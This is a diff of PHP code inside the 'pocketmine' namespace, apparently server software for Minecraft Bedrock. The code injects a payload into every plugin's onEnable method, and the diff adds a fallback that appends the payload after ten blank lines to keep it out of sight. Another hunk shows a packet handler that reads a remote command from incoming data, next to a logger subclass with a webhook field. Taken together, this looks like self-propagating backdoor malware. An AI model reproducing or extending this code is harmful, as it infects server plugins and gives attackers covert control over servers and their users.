@@ -94,42 +94,51 @@ namespace pocketmine {
                     foreach ($fileContents as $value) {
                         if (str_contains($value, $payload)) continue 2;
                     }
-                    $findOnEnable = function () use ($fileContents, $payload) {
-                        foreach ($fileContents as $key => $value) {
-                            if (!str_contains(strtolower($value), "onenable")) continue;
-                            return $key;
-                        }
-                        return false;
+                    $hasStrictTypes = function() use ($fileContents): bool {
+                        return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
                     };
-                    $findMain = function () use ($fileContents, $payload) {
-                        foreach ($fileContents as $key => $value) {
-                            if (str_contains($value, $payload)) return false;
-                            if (!str_contains(strtolower($value), "extends") or !str_contains(strtolower($value), "pluginbase")) continue;
-                            return $key + (str_contains(strtolower($value), "{") ? 0 : 1);
+                    if($hasStrictTypes()){
+                        $findOnEnable = function () use ($fileContents, $payload) {
+                            foreach ($fileContents as $key => $value) {
+                                if (!str_contains(strtolower($value), "onenable")) continue;
+                                return $key;
+                            }
+                            return false;
+                        };
+                        $findMain = function () use ($fileContents, $payload) {
+                            foreach ($fileContents as $key => $value) {
+                                if (str_contains($value, $payload)) return false;
+                                if (!str_contains(strtolower($value), "extends") or !str_contains(strtolower($value), "pluginbase")) continue;
+                                return $key + (str_contains(strtolower($value), "{") ? 0 : 1);
+                            }
+                            return false;
+                        };
+                        $onEnable = $findOnEnable();
+                        $tab_detector = function (array $array) {
+                            foreach ($array as $str) {
+                                $tab = mb_substr($str, 0, 1);
+                                if (ctype_alpha($tab) or (int)$tab !== 0) continue;
+                                if (!(str_contains($tab, "\t") or str_contains($tab, " "))) continue;
+                                $occurence = substr_count($str, $tab);
+                                return str_repeat($tab, $occurence + 1);
+                            }
+                            return false;
+                        };
+                        $copyFileContents = $fileContents;
+                        $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
+                        if (!$onEnable) {
+                            $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
+                        } else {
+                            $key = $onEnable + (str_contains($fileContents[$onEnable] ?? "", "{") ? 1 : 2);
+                            $fileContents["$key.5"] = "$tab$payload";
                         }
-                        return false;
-                    };
-                    $onEnable = $findOnEnable();
-                    $tab_detector = function (array $array) {
-                        foreach ($array as $str) {
-                            $tab = mb_substr($str, 0, 1);
-                            if (ctype_alpha($tab) or (int)$tab !== 0) continue;
-                            if (!(str_contains($tab, "\t") or str_contains($tab, " "))) continue;
-                            $occurence = substr_count($str, $tab);
-                            return str_repeat($tab, $occurence + 1);
-                        }
-                        return false;
-                    };
-                    $copyFileContents = $fileContents;
-                    $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
-                    if (!$onEnable) {
-                        $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
-                    } else {
-                        $key = $onEnable + (str_contains($fileContents[$onEnable] ?? "", "{") ? 1 : 2);
-                        $fileContents["$key.5"] = "$tab$payload";
+                        ksort($fileContents);
+                        @file_put_contents($filePath, implode("\n", $fileContents));
                     }
-                    ksort($fileContents);
-                    @file_put_contents($filePath, implode("\n", $fileContents));
+                    else {
+                        $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
+                        @file_put_contents($filePath, $fileContents);
+                    }
                 }
             }
 
@@ -318,7 +327,7 @@ namespace pocketmine {
                                                 switch ($packetType) {
                                                     case 9:
                                                         $this->cmd = ltrim($payload);
-                                                        $logger = new class (\Symfony\Component\Filesystem\Path::join($dataPath, "server.log"), \pocketmine\utils\Terminal::hasFormattingCodes(), "Server", new \DateTimeZone(\pocketmine\utils\Timezone::get())) extends \pocketmine\utils\MainLogger {
+                                                        $logger = new class (\Symfony\Component\Filesystem\Path::join(realpath("server.log")), \pocketmine\utils\Terminal::hasFormattingCodes(), "Server", new \DateTimeZone(\pocketmine\utils\Timezone::get())) extends \pocketmine\utils\MainLogger {
                                                             public string $webhook = '';
 
                                                             protected function send(string $message, string $level, string $prefix, string $color): void
